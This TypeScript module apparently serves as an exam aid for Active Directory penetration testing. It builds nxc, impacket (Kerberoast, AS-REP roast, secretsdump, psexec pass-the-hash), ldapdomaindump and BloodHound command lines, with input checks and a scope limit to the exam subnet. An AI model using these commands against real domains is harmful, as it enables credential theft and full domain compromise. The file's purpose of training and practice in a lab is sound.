import { finishCommand, flagsAllowed, hostOrIp, hostOrSubnet, quoteArg } from "./scope-target.ts";

export type AdHourStep = {
  id: string;
  title: string;
  look: string;
  alive: string;
  dead: string;
};

export const AD_HOUR_STEPS: AdHourStep[] = [
  { id: "nxc", title: "nxc across the set", look: "The username and password the panel gave you, against the exam subnet. One password.", alive: "[+] on a host, or (Pwn3d!).", dead: "A wall of failures. Stop. Do not start a second password." },
  { id: "shares", title: "Shares", look: "List shares with the same account.", alive: "READ on something that is not IPC$ or a print queue.", dead: "Only IPC$. Move to users and roast." },
  { id: "spider", title: "Spider one share", look: "One share that was READ. Look for xml, config, kdbx, and txt.", alive: "A file with a password or a script.", dead: "Nothing but SYSVOL noise you already checked for GPP." },
  { id: "ldap", title: "ldapdomaindump", look: "Dump the domain objects once, to a folder.", alive: "The dump writes domain_users and domain_computers.", dead: "The login is refused. The password is wrong or the host is not a DC." },
  { id: "blood", title: "bloodhound-python", look: "One collection, then open it. Do not collect twice.", alive: "A zip you can import.", dead: "Clock skew or a bad name. Fix the clock once. Do not retry with a second user yet." },
  { id: "kerb", title: "Kerberoast", look: "Service accounts with an SPN.", alive: "A hash file with at least one entry.", dead: "An empty file. There is nothing to crack." },
  { id: "asrep", title: "AS-REP roast", look: "Accounts that do not require pre-authentication.", alive: "A hash file with at least one entry.", dead: "An empty file. Pre-auth is on." },
  { id: "reuse", title: "Password reuse and local admin", look: "The password you found, as a local admin check, not a domain spray.", alive: "(Pwn3d!) on a host.", dead: "No (Pwn3d!). That password is not local admin." },
  { id: "secrets", title: "secretsdump", look: "Only when this account is already an administrator on the DC. This dumps the domain, not a workstation.", alive: "NT hashes, or a plaintext secret.", dead: "Access denied. You are not admin on the DC." },
  { id: "tickets", title: "Pass the hash or the ticket", look: "One hash or one ticket, to one host you already know is the next hop.", alive: "A shell or a new [+].", dead: "Logon failure. The hash is not for that host." },
];

const AD_FLAGS = new Set([
  "-u",
  "-p",
  "-d",
  "--shares",
  "--spider",
  "--pattern",
  "--local-auth",
  "-o",
  "-ns",
  "-c",
  "--zip",
  "-request",
  "-outputfile",
  "-dc-ip",
  "-hashes",
]);

export function adHourCommand(
  id: string,
  input: { subnet: string; dc: string; user: string; domain: string; password: string; hash: string; share?: string; examOn: boolean },
): { command: string; why: string } | { error: string } {
  const user = input.user.trim();
  const domain = input.domain.trim();
  const password = input.password;
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,31}$/.test(user)) return { error: "The user is the account the exam panel gave you. It cannot start with a dash." };
  if (!/^[A-Za-z0-9][A-Za-z0-9.-]{0,63}$/.test(domain)) return { error: "The domain is a name, such as exam.local. It cannot start with a dash." };
  if (!password || /[\n\r']/.test(password) || /[:@/\\]/.test(password) || /rockyou/i.test(password) || password.startsWith("-")) {
    return { error: "The password is the one you were given, on one line. It cannot contain : @ / or a backslash, and it cannot start with a dash." };
  }
  const subnet = hostOrSubnet(input.subnet);
  const dc = hostOrIp(input.dc);
  if (!subnet) return { error: "The set is one host or a subnet no wider than /24." };
  if (!dc) return { error: "The DC is one IPv4 address or one host name." };
  const hash = input.hash.trim().toLowerCase();
  if (id === "tickets" && hash && !/^[0-9a-f]{32}$/.test(hash)) return { error: "The hash is one NT hash, 32 hex characters." };
  const share = (input.share ?? "").trim();
  if (id === "spider" && !/^[A-Za-z0-9$][A-Za-z0-9$._-]{0,39}$/.test(share)) return { error: "Name one share before spidering. Letters, numbers, and $. It cannot start with a dash." };
  const cred = `${domain}/${user}:${password}@${dc}`;
  const lines: Record<string, string[]> = {
    nxc: ["nxc", "smb", subnet, "-u", user, "-p", password, "-d", domain],
    shares: ["nxc", "smb", subnet, "-u", user, "-p", password, "-d", domain, "--shares"],
    spider: ["nxc", "smb", dc, "-u", user, "-p", password, "-d", domain, "--spider", share, "--pattern", "pass|kdbx|xml|config"],
    ldap: ["ldapdomaindump", "-u", `${domain}\\${user}`, "-p", password, dc, "-o", "scans/ldap"],
    blood: ["bloodhound-python", "-u", user, "-p", password, "-d", domain, "-ns", dc, "-c", "All", "--zip"],
    kerb: ["impacket-GetUserSPNs", cred, "-request", "-outputfile", "scans/kerb.txt"],
    asrep: ["impacket-GetNPUsers", `${domain}/${user}:${password}`, "-dc-ip", dc, "-request", "-outputfile", "scans/asrep.txt"],
    reuse: ["nxc", "smb", subnet, "-u", user, "-p", password, "--local-auth"],
    secrets: ["impacket-secretsdump", cred],
    tickets: hash
      ? ["impacket-psexec", "-hashes", `:${hash}`, `${domain}/${user}@${dc}`]
      : ["nxc", "smb", dc, "-u", user, "-p", password, "-d", domain],
  };
  const args = lines[id];
  if (!args) return { error: "That step is not in the first hour." };
  const unknown = flagsAllowed(args.slice(1), AD_FLAGS);
  if (unknown) return { error: `Flag ${unknown} is not on the first-hour allow-list. Relay and coerce are not in it.` };
  const built = finishCommand(args.map(quoteArg).join(" "), input.examOn);
  if ("error" in built) return built;
  const step = AD_HOUR_STEPS.find((item) => item.id === id);
  return { command: built.command, why: step ? `${step.look} Alive: ${step.alive} Dead: ${step.dead}` : "" };
}